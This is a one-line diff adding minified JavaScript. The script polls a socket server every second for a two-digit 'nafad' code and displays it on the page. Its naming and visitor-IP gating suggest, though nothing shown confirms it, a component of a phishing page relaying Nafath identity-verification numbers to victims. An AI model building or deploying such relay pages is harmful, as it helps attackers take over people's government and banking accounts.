@@ -1,0 +1,1 @@
+document.addEventListener("DOMContentLoaded",()=>{let e=document.getElementById("nafad_code"),t;function r(){window.visitorIP&&socket.emit("getNafadCode")}socket.on("nafadCode",r=>{if(r.error){console.error("nafadCode error:",r.error);return}let d=null==r.code?"":String(r.code).padStart(2,"0");d&&"00"!==d&&(e.textContent=d,clearInterval(t))}),t=setInterval(r,1e3),r()});
